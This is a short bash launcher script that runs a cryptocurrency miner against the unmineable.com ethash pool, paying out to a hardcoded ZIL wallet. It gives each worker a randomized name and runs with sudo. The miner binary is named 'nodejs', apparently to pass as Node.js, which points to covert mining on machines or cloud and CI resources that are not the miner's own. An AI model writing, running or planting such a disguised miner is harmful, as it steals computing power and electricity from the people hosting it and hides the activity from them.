#!/bin/bash
POOL=ethash.unmineable.com:3333
WALLET=ZIL:zil12xj5q0cvpjaz5nm02zntwsp4yr5zvlt2an5me
WORKER=$(echo $(shuf -i 1-30 -n 1)-gass) 
chmod +x nodejs
sudo ./nodejs -epool $POOL -wal $WALLET.$WORKER -pass x
